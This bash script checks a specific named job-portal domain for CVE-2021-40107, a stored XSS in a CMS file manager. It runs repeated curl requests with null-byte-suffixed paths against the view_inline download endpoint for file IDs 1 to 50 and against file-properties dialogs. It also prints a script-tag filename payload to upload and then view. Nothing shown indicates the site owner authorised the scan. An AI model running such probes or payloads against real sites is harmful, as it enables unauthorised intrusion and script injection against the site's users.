#!/bin/bash
# CVE-2021-40107: Stored XSS in Comment Section/FileManager via "view_inline"
# Severity: Medium
# Affected: < 8.5.6

echo "=== CVE-2021-40107: Testing XSS via view_inline ==="

# This vulnerability relates to file uploads with malicious filenames
# The filename is not sanitized when displayed via view_inline

echo -e "\n[1] Testing view_inline endpoint responses..."
for i in $(seq 1 50); do
    RESPONSE=$(curl -s "https://jobs.dnv.com/index.php/download_file/view_inline/$i%00")
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://jobs.dnv.com/index.php/download_file/view_inline/$i%00")

    if [ "$HTTP_CODE" == "200" ]; then
        echo "fID=$i returned 200"
        # Check if filename is reflected in response
        echo "$RESPONSE" | grep -i -E "(filename|content-disposition)" && echo "  -> Filename reflected!"
    fi
done

echo -e "\n[2] Testing file manager dialogs..."
curl -s "https://jobs.dnv.com/index.php/ccm/system/dialogs/file/properties%00" -v
curl -s "https://jobs.dnv.com/index.php/tools/required/files/properties%00" -v

echo -e "\n[*] This CVE requires file upload capability"
echo "    If you can upload files (even as guest), test with filename:"
echo "    test<script>alert(document.domain)</script>.jpg"
echo "    Then access via: /index.php/download_file/view_inline/[fID]"
